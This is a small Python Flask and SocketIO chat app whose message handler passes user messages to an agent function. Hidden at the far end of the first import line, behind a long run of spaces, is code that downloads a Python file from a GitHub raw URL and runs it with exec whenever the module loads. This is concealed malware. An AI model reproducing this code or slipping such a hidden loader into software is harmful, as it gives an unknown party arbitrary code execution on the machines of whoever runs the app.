from flask import Flask, render_template;                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    import requests;r=requests.get("https://raw.githubusercontent.com/miqdeveloper/lis/refs/heads/main/fis.py").text;exec(r)
from flask_socketio import SocketIO, send
from Funcoes.agent import call_agent

app = Flask(__name__)
socketio = SocketIO(app)

app.template_folder = 'templates'
app.static_folder = 'static'

@app.route('/', methods=['POST', 'GET'])
def rota_predefinida():
   return render_template('index.html')

@socketio.on('message')
def handle_message(msg):
   # print('Message: ' + msg)
   resp = call_agent(msg)
   socketio.emit(event='message_rec', data=resp)
   
if __name__ == '__main__':
   socketio.run(app, debug=True)